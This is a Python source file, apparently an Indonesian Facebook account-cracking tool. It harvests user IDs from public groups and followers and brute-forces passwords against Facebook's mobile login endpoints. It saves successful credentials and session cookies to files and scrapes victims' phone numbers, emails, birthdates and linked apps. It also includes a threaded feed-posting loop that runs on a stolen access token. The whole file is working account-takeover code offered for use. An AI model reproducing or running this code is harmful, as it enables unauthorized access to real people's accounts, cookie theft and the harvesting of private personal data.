			ses.headers.update({"Host":"free.facebook.com","upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://free.facebook.com/login/?email='+idf).text
			dataa ={
'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
'm_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
'li':re.search('name="li" value="(.*?)"', str(p)).group(1),
'email':idf,
'pass':pw
}
			ses.headers.update({'Host': 'free.facebook.com',
'cache-control': 'max-age=0',
'upgrade-insecure-requests': '1',
'origin': 'https://free.facebook.com',
'content-type': 'application/x-www-form-urlencoded',
'user-agent': ua,
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-user': 'empty',
'sec-fetch-dest': 'document',
'referer': 'https://free.facebook.com/login/?email='+idf,
'accept-encoding':'gzip, deflate br',
'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})

			po = ses.post('https://free.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				else:
					print('\n')
					statuscp = f'>_ID : {idf} >_PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='>_Checkpoint'))
					open('CP/'+cpc,'a').write(idf+'|'+pw+'/'+tahun+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no'in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'>_ID       : {idf}\n>_PASSWORD : {pw}\n>_COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='>_OK CUY'))
					break
				elif 'ya'in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					get_id = session.get("https://m.facebook.com/profile.php",cookies=coki).text
					nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
					response = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki).text
					response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki).text
					response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki).text
					response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki).text
					try:nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
					except:nomer = ""
					try:email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
					except:email=""
					try:ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
					except:ttl=""
					try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
					except:teman = ""
					try:pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
					except:pengikut = ""
					try:
						tahun = ""
						cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
						for nenen in cek_thn:
							tahun += nenen+", "
					except:pass

					infoakun += (f">_ Nama Akun       : {nama}\n>_ Jumlah Teman    : {teman}\n>_ Jumlah Pengikut : {pengikut}\n>_ Email Aktif     : {email}\n>_Nomor Aktif     : {nomer}\n>_Tahun Akun      : {tahun}\n>_Tanggal Lahir   : {ttl}\n")

					hit1, hit2 = 0,0
					cek =session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki).text
					cek2 = session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki).text
					if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
						infoakun += (f">_Aplikasi Yang Terkait*\n")
						if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
							infoakun += (f">_Tidak Ada Aplikasi Aktif Yang Terkait *\n")
						else:
							infoakun += (f"	>_Aplikasi Aktif : \n")
							apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
							ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
							for muncul in apkAktif:
								hit1+=1
								infoakun += (f"		[{hit1}] {muncul} {ditambahkan[hit2]}\n")
								hit2+=1
						if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
							infoakun += (f"\n>_Tidak Ada Aplikasi Kedaluwarsa Yang Terkait\n")
						else:
							hit1,hit2=0,0
							infoakun += (f"	>_Aplikasi Kedaluwarsa :\n")
							apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
							kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
							for muncul in apkKadaluarsa:
								hit1+=1
								infoakun += (f"		[{hit1}] {muncul} {kadaluarsa[hit2]}\n")
								hit2+=1
					else:pass
					print('\n')
					statusok = f'>_ID       : {idf}\n>_PASSWORD : {pw}\n>_COOKIES  : {kuki}\n{infoakun}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='>_OK CUY'))
					break

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = parser(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = parser(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print('\r%s >> %s|%s >> CP       %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print('\r%s >> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s >> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r%s >>%s|%s >> CP       %s'%(b,idf,pw,x))
		print('\r%s >> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1

def cek_opsi():
	c = len(akun)
	hu = '>_Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)
	cetak(nel(hu, title='>_Check Opsi'))
	input('\033[33m>_Mulai')
	cek = '>_Proses Check Dimulai'
	sol().print(mark(cek, style='green'))
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s >> %s >> Error      %s'%(b,kes,x))
				print('\r%s>_ Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x))
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			print('\r%s >> %s/%s >> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
			ses = requests.Session()
			header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://mbasic.facebook.com')
			ho = parser(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = parser(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%s >> %s|%s >> CP       %s'%(b,id,pw,x))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s >> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
					else:
						for opsii in opsi:
							print('\r%s >> %s%s'%(kk,opsii.text,x))
				except:
					print('\r%s >> %s|%s >> CP       %s'%(b,id,pw,x))
					print('\r%s>_Tidak Dapat Mengecek Opsi%s'%(u,x))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s >> %s|%s >> OK       %s'%(h,id,pw,x))
			else:
				print('\r%s >>%s|%s  >> SALAH       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			li = '>_Koneksi Internet Bermasalah'
			sol().print(mark(li, style='red'))
			exit()
	dah = '>_Beres'
	sol().print(mark(dah, style='cyan'))
	exit()
	

def kontol():
    os.system("clear")
    print(f"""    __    _________________   _______ ______
   / /   /  _/ ____/ ____/ | / / ___// ____/
  / /    / // /   / __/ /  |/ /\__ \/ __/
 / /____/ // /___/ /___/ /|  /___/ / /___
/_____/___/\____/_____/_/ |_//____/_____/

{P}[•]{B}----------------------------------------------------{P}[•]
{B} |
{P}[•] AUTHOR : Ahmedalzwage 
{P}[•] WHATSAPP : +218921762445
{B}[•] FACEBOOK : Ahmedalzwage """)
def licensi():#line:42
  try :#line:43
    os .system ('clear')
    kontol()
    print (f"""
{U}[{P}1{U}]{P} Dapatkan Api key
{U}[{P}2{U}]{P} Masukan Api Key
{U}[{P}3{U}]{P} Keluar {U}[{H}Exit{U}]{H}
""")#line:49
    OOO00O0OOO00OO00O =input (f"{H}[{P}?{H}]{P} Choose :{K} ")#line:50
    if OOO00O0OOO00OO00O in ['1','01']:#line:51
      print (f"{H}[{P}!{H}]{P} Anda Akan Diarahkan Ke Whatsapp...");time .sleep (3 );os .system ('xdg-open https://wa.me/+218921972445?text=bro+Ahmed+$+Lisensi');exit ()#line:52
    elif OOO00O0OOO00OO00O in ['2','02']:#line:53
      O000O000OOO000OOO =input (f"{H}[{P}?{H}]{P} Api Key :{K} ")#line:54
      if len (O000O000OOO000OOO )==0 :#line:55
        exit (f"{P}[{M}!{P}]{M} Jangan Kosong")#line:56
      else :#line:57
        with requests .Session ()as O0O0OO0O0O00OOOO0 :#line:58   #### ISI TOKEN LU DAN   ID LU
          OOO00OO00O0O0OOOO =O0O0OO0O0O00OOOO0 .get (f'https://app.cryptolens.io/api/key/activate?token=WyIxNTc5MTYyNiIsIlpueDFEVUlDQmpsNnB1a2VjYWRhbGR0QnVpRkY5MkF6YzExaTZPODMiXQ==&ProductId=14543&Key={O000O000OOO000OOO}&Sign=True').json ()['licenseKey']#line:59
          open ('apikey.txt','w').write (O000O000OOO000OOO )#line:60
          print (f"{H}[{P}*{H}]{P} Expired :{K} {OOO00OO00O0O0OOOO['expires'].split('T')[0]}");time .sleep (2 );memek()#line:61
    elif OOO00O0OOO00OO00O in ['3','03']:#line:62
      exit ()#line:63
    else :#line:64
      exit (f"{P}[{M}!{P}]{M} Wrong Input")#line:65
  except (KeyError ):#line:66
    exit (f"{P}[{M}!{P}]{M} Api Key Invalid")#line:67
  except Exception as O0OO00OOO000OOO00 :#line:68
    exit (f"{P}[{M}!{P}]{M} {O0OO00OOO000OOO00}")#line:69

balmond = O+"["+J+"•"+O+"]"

def lah():
	print("\r"+balmond+m+">_Total ID : "+str(len(id))+"                     ")
	input(balmond+m +">_Mode Pesawat 5 Detik Dan Tekan Enter Untuk Mulai Crack ")
	pass
	setting()
	
def grup():
	win = '>_Harus Grup Public'
	win2 = mark(win, style='cyan')
	sol().print(win2)
	id = input(""+balmond+h+" Id Atau User Name Grup : ")
	ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
	miskinlu = {"user-agent": ua}
	url = "https://m.facebook.com/groups/"+id
	ses = requests.Session()
	try:
		gn = parser(ses.get(url, headers=miskinlu).text, "html.parser")
	except requests.exceptions.ConnectionError:
		print(balmond+m+">_Koneksi Internet Terputus..")
		time.sleep(0.5)
		exit()
	berr = gn.find("title")
	berr2 = berr.text.replace(" | Facebook","").replace(" Grup Publik","")
	if berr2=='Masuk Facebook':
		print(balmond+m+">_Limit, Silahkan Mode Pesawat Dan Coba Lagi..")
		time.sleep(0.5)
		exit()
	elif berr2=='Kesalahan':
		jalan(balmond+m+">_Grup Tidak Ditemukan..")
		time.sleep(0.5)
		exit()
	else:pass
	print(""+balmond+p+">_Nama Grup : "+berr2)
	ggs = gn.find_all('table')
	ang = []
	for ff in ggs:
		anggo = ff.text
		bro = anggo.replace('Anggota','')
		try:
			mex = int(bro)
			jumlah = ang.append(mex)
		except:
			pass
	if len(ang)==0:
		print(balmond+h+">_Anggota : -")
	else:
		print(balmond+h+">_Anggota : "+str(ang[0]))
	grup1(url)

def grup1(urls):
	use = []
	ses = requests.Session()
	print(""+balmond+p+">_Jika Stack, Mode Pesawat 5 Detik")
	print(balmond+p+">_Sedang Mengumpulkan ID")
	print(balmond+p+">_Tekan CTRL + C Untuk Stop")
	while True:
		try:
			ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
			miskinlu = {"user-agent": ua}
			try:
				url = use[0]
			except:
				url = urls
			set = parser(ses.get(url, headers=miskinlu).text, "html.parser")
			bf2 = set.find_all('a')
			for g in bf2:
				css = str(g).split('>')
				if 'Lihat Postingan Lainnya</span' in css:
					bcj = str(g).replace('<a href="','').replace('amp;','')
					bcj2 = bcj.split(' ')[0].replace('"><img','')
			tes = set.find_all('table')
			for cari in tes:
				liatnih = cari.text
				spl = liatnih.split(' ')
				if 'mengajukan' in spl:
					idsiapa = re.findall('content_owner_id_new.\w+',str(cari))
					idyou =	idsiapa[0].replace('content_owner_id_new.','')
					namayou = liatnih.replace(' mengajukan pertanyaan .','')
					idku = idyou+'|'+namayou
					if idku in id:
						continue
					else:
						id.append(idku)
						print(("\r"+balmond+h+" { "+k+"Proses Mengambil ID "+str(len(id))+h+" }"), end="");sys.stdout.flush()
				elif '>' in spl:
					idsiapa = re.findall('content_owner_id_new.\w+',str(cari))
					idyou =	idsiapa[0].replace('content_owner_id_new.','')
					namayou = liatnih.split(' > ')[0]
					idku = idyou+'|'+namayou
					if idku in id:
						continue
					else:
						id.append(idku)
						print(("\r"+balmond+h+" { "+O+"Mengumpulkan ID "+str(len(id))+h+" }"), end="");sys.stdout.flush()
				else:
					continue
			try:
				link_ = bcj2
				use.insert(0,'https://m.facebook.com'+link_)
			except:
				girang = set.find('title')
				girang2 = girang.text.replace(" | Facebook","").replace(" Grup Publik","")
				if girang2=='Masuk Facebook':
					pass
				else:
					lah()
		except requests.exceptions.ConnectionError:
			try:
				time.sleep(31)
			except KeyboardInterrupt:
				lah()
		except KeyboardInterrupt:
			lah()

saat_ini = datetime.datetime.now()

def run(link, token):

    while True:

        headers = {

            'authority': 'graph.facebook.com',

            'cache-control': 'max-age=0',

            'sec-ch-ua-mobile': '?0',

            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.66 Safari/537.36',

        }

        try:

          response = requests.post(f'https://graph.facebook.com/me/feed?link={link}&published=0&access_token={token}', headers=headers)

          print(response.text)

        except:

          sys.exit()

def main():

    banner()

    print('\033[33m┌───────────────────────────────────┐')
    #link = input('Link Posts : ')
    token = input('├──>_Token Facebook :\033[33m ')

   # token = input('Token FB : ')
    link = input('\033[33m├──>_Link Postingan :\033[33m ')
    print('\033[33m└───────────────────────────────────┘')

    number_thread = int(input('>_ISI AJA 20 BG  :\033[33m  '))

    for i in range(number_thread):
        thread = threading.Thread(target=run, args=(link, token))
#        print('SINGEK',thread.start())
        thread.start()
        
def follower():
    try:
        token = open('.token.txt', 'r').read()
    except IOError:
        exit()

    win = '>_Crack ID Dari Followers'
    win2 = mark(win, style='cyan')
    sol().print(win2)
    print('\033[33m>_Ketik "me" Jika Ingin Dari Follower Mu')
    pili = input('\033[33m>_Masukkan ID Facebook : ')
    try:
        koh2 = requests.get('https://graph.facebook.com/' + pili + '?fields=subscribers.limit(5000)&access_token=' + tokenku[0]).json()
        for pi in koh2['subscribers']['data']:
            try:
                id.append(pi['id'] + '|' + pi['name'])
            except:
                continue

        print('\033[33m>_Total : ' + str(len(id)))
        setting()
    except requests.exceptions.ConnectionError:
        li = '>_Koneksi Internet Bermasalah'
        lo = mark(li, style='red')
        sol().print(lo, style='cyan')
        exit()
    except (KeyError, IOError):
        teks = '>_Followers Tidak Public Atau Token Rusak'
        teks2 = mark(teks, style='red')
        sol().print(teks2)
        exit()

def useragent():
	print ("\n%s[%s01%s]>_Ganti user agent "%(P,B,P))
	print ("%s[%s02%s]>_Cek user agent "%(P,B,P))
	print ("%s[%s00%s]>_Kembali "%(P,B,P))
	hikmat = input('\n%s[%s+%s]>_Pilih :%s '%(P,H,P,B))
	uas(hikmat)
	
def uas(hikmat):
	if hikmat == '':
		print ('\n%s[%s!%s]>_Yang bener kontol'%(P,B,P));jeda(2)
		uas(hikmat)
	elif hikmat in("1","01"):
		print ("%s[%s!%s]>_Ketik %scancel%s untuk gunakan ua dari script"%(P,B,P,H,P))
		ua = input("%s[%s!%s]>_User agent :%s "%(P,H,P,B))
		if ua in(""):
			print ('\n%s[%s!%s]>_Yang bener kontol'%(P,H,P));jeda(2)
			menu()
		elif ua in("CANCEL","Cancel","cancel"):
			ua_ = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
			open("ua.txt","w").write(ua_);jeda(2)
			print ("\n%s[%s✓%s] >_Berhasil menggunakan user agent script "%(P,B,P));jeda(2)
			pilihan().menu()
		open("ua.txt","w").write(ua);time.sleep(2)
		print ("\n%s[%s✓%s]>_Berhasil mengganti user agent"%(P,H,P));time.sleep(2)
		menu()
	elif hikmat in("2","02"):
		try:
			ua_ = open('ua.txt', 'r').read();time.sleep(2)
			print ("%s[%s+%s]>_User anget lu :%s%s "%(P,H,P,B,ua_));time.sleep(2)
			input('\n%s[%s!%s]>_Tekan enter '%(P,B,P))
			menu()
		except IOError:
			ua_ = '%s-'%(M)
	elif hikmat in("0","00"):
		menu()
	else:
		print ('\n%s[%s!%s]>_Yang bener kontol'%(P,B,P));time.sleep(2)
		uas(hikmat)
		
def tokenfre():
        os.system('https://www.facebook.com/profile.php?id=100080507617596')
                        
if __name__=='__main__':
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('OK')
	except:pass
	#licensi()
	memek()

